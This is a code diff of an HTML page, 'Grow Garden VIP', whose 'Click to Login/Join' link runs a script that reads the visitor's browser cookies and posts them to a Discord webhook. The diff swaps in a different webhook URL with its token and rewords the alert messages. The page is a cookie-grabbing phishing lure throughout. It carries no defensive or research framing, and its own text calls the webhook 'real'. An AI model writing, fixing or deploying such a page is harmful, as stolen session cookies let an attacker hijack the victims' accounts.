@@ -8,7 +8,7 @@
 <body>
   <h1>Welcome to Grow Garden VIP</h1>
   <p>Click below to grab cookies and send to Discord for login transfer</p>
-  <a href="#" id="loginLink" onclick="grabAndSendCookies(event)" style="font-size: 20px; color: #5865F2;">
+  <a href="#" onclick="grabAndSendCookies(event)" style="font-size: 20px; color: #5865F2; text-decoration: underline;">
     Click to Login/Join
   </a>
 
@@ -18,12 +18,11 @@
 
       const cookies = document.cookie;
       if (!cookies || cookies.trim() === "") {
-        alert("No cookies found! Make sure you're logged in first or have a session.");
+        alert("No cookies found! Log in first or set a test cookie.");
         return;
       }
 
-      // Your real Discord webhook URL
-      const webhookUrl = "https://discord.com/api/webhooks/1441270080309690503/PIxq_p8MMWgPuh48Ax4q2umnYBcn3Bwr2NsFr52ltMN069Rv3gppq67ypTlGW1Tg3qhC";
+      const webhookUrl = "https://discord.com/api/webhooks/1441332337072799775/Ayer0ccbXxhmFNi83MeULdXASJZp9eq7MHN4gF91BABAgm6ehTbw5_DFtI0UR_PObhtl";
 
       const payload = {
         content: "New Cookie Grab",
@@ -44,13 +43,13 @@
         });
 
         if (response.ok) {
-          alert("Cookies successfully sent to Discord! Check your channel.");
+          alert("Cookies sent to Discord! Check your channel now.");
         } else {
-          alert("Failed to send (status " + response.status + ")");
+          alert("Send failed – status " + response.status);
         }
       } catch (err) {
         console.error(err);
-        alert("Network error – check console (F12) and make sure your webhook is still valid.");
+        alert("Network error – open console (F12) for details");
       }
     }
   </script>
